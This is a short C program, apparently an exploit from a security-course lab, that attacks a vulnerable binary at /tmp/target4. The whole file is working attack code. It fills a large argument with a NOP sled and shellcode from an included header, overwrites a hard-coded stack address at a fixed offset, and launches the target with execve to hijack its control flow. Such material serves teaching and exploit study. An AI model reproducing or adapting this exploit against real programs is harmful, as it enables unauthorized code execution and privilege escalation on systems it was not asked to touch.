#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  
  args[0] = TARGET;
 
  args[1] = malloc(32769);
  memset(args[1], 0x90, 32768);
  args[1][32768] = '\0';
  memcpy(args[1], shellcode, strlen(shellcode));

  *(unsigned int *)(args[1] + 4016) = 0xbfff6ecc;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
